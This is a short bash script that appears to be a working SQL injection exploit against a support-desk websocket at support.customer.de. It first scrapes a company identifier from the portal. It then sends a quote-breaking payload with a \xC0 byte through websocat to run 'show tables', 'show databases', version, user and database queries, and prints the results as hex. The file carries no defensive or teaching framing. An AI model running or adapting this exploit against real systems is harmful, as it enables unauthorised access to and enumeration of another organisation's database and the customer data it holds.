#!/bin/bash
company=$(curl -k -s https://support.customer.de/get_portal_info|cut -d'=' -f2|tail -n1|cut -d';' -f1|tr -d '\n\r')

extract_data() {
    echo "═══ $1 ═══"
    echo -ne "1\n\n0\n\xC0';$1-- -\n" | \
    websocat -k wss://support.customer.de/nw \
        --protocol "ingredi support desk customer thin" \
        -H "X-Ns-Company: $company" \
        --binary | \
    xxd | head -20
    echo ""
}

extract_data "show tables"
extract_data "show databases" 
extract_data "select version()"
extract_data "select user()"
extract_data "select database()"
